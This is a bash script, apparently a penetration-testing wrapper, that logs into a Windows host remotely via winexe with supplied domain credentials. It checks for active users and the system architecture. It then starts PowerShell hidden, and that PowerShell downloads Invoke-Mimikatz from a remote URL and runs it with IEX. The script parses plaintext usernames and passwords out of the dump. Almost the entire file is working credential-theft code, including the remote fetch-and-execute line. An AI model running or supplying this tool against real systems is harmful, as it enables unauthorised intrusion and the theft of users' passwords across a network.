#!/bin/bash
# @hecky - Neobits.mx
# ./mimiwin.sh - Wrapper to remotely execute Invoke-Mimikatz and parse the output on the fly. (Something like cme -M mimikatz but on shell scripting with no extra dependencies but [winexe,wmiexec,pth-winexe,whateveryouwant...])
# It launches winexe by default but can be changed to anything else.
# Specify Invoke-Mimikatz.ps1 location on URL var (Or any other powershell script that you want to test but take care of 'parse' function)

# Colors
red="\033[1;31m"
grn="\033[1;32m"
yl="\033[1;33m"
blue="\033[1;34m"
cyan="\033[36m"
reset="\033[m"
bullet="$yl[+]$reset "

# Banner and Arguments
function banner(){
	echo -e "[ $cyan@hecky$reset from $grn""Neobits.mx$reset ]\n\n\t$red./mimiwin.sh$reset -i $blue<ip>$reset -u $blue<user>$reset -p $blue<password>$reset -d $blue<domain>$reset\n"
}

if [[ $# -ne 8 ]];then 
	banner ; exit 1
fi

# GetOpts in shell scripting <3
while getopts ":i:u:p:d:" option; do
	case  $option in
		\?)	banner
			exit 1 ;;
		:)	banner
			echo -e "Option -$OPTARG requires an argument.\n" 
			exit 1 ;;
		i) IP=${OPTARG} ;;
		u) USER=${OPTARG} ;;
		p) PASSWORD=${OPTARG} ;;
		d) DOMAIN=${OPTARG} ;;
	esac
done


# Info
Credentials="$DOMAIN\\$USER%$PASSWORD"
OUTFILE="$IP.mimidump"

# Invoke-Mimikatz & Powershell string
URL="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"	# Where is your script stored?
Invoke="-noProf  -wI  hiDdeN  -noNIntEr -c \"IEX (New-Object Net.WebClient).DownloadString('$URL'); Invoke-Mimikatz ; [Environment]::Exit(1)\""

# Powershell's Path
Sysnative='C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe'
System32='C:\Windows\system32\windowspowershell\v1.0\powershell.exe'
Syswow64='C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'

# Get windows arch
GetArch="cmd.exe /c wmic os get osarchitecture"

# What to use to execute? Winexe, PTH-winexe, psexec.py, wmiexec.py ow maybe even a webshell? Just specify here :) 
Execute="winexe --system --uninstall -U $Credentials //$IP"

# Function to parse Mimikatz's output
function parse(){
	cat $1  | dos2unix | grep -a Password -B2 | grep -e "Password.*null" -e logonPasswords -v | egrep "Password.*([abcdef1234567890]{2}\s)+" -v | grep Password -B2 | awk '/\*/ {print $line}' | sed 's/\t\s\*\s//' | awk '1; NR%3==0 {print "---___---"}' | sed -E 's/(Username|Domain|Password)\s+:\s+//' | tr "\n" "\t" | sed 's/---___---/\n/g' | sed 's/^\t//' | sort -u | awk '{print "\t\t\t"$1"\t"$3}' | sort -u | grep ".*"
}


# Qwinsta - Look for active users on the machine (You can delete if you want this validation
active_users=$($Execute "cmd.exe /c qwinsta" | tail -n +2 | sed 's/  [0-9]\+ .*$/@/ ; s/[ ]\+@.*// ; s/^ //' | tr ' ' '@' | tr -s '@' | egrep -o "@.*$")

if [[ $active_users = "" ]];then
	echo -ne "$red[*]$reset $IP: No active users, not going further\n"
else
	arch=$($Execute "$GetArch" | awk -F '-' '/bit/ {print $1}')
	if [[ $arch == "32" ]];then
		# Get Powershell Folder
		dir=$($Execute 'cmd.exe /c dir C:\Windows\Sys*' | grep -i sysnative &> /dev/null ; echo $?)
		if [[ "$dir" == '0' ]];then
			echo -en "$bullet$IP \tArch: $red$arch bits$reset\tPowershell folder: $grn Sysnative$reset\tLog: $blue$OUTFILE$reset\n"
			$Execute "$Sysnative $Invoke" >> $OUTFILE 2> /dev/null
			parse $OUTFILE
		else
			echo -en "$bullet$IP \tArch: $red$arch bits$reset\tPowershell folder: $grn System32$reset\tLog: $blue$OUTFILE$reset\n"
			$Execute "$System32 $Invoke" >> $OUTFILE 2> /dev/null
			parse $OUTFILE
		fi
	elif [[ $arch == "64" ]];then
		dir=$($Execute 'cmd.exe /c dir C:\Windows\Sys*' | grep -i syswow64 &> /dev/null ; echo $?)
		if [[ "$dir" == '0' ]];then
			echo -en "$bullet$IP \tArch: $red$arch bits$reset\tPowershell folder: $grn System32$reset\tLog: $blue$OUTFILE$reset\n"
			$Execute "$System32 $Invoke" >> $OUTFILE 2> /dev/null
			parse $OUTFILE
		else	
			echo -en "$bullet$IP \tArch: $red$arch bits$reset\tPowershell folder: $grn Syswow64$reset\tLog: $blue$OUTFILE$reset\n"
			$Execute "$Syswow64 $Invoke" >> $OUTFILE 2> /dev/null
			parse $OUTFILE
		fi
	else
		echo "$red[+]$reset Something went wrong... Arch couldn't be detected"
	fi
fi
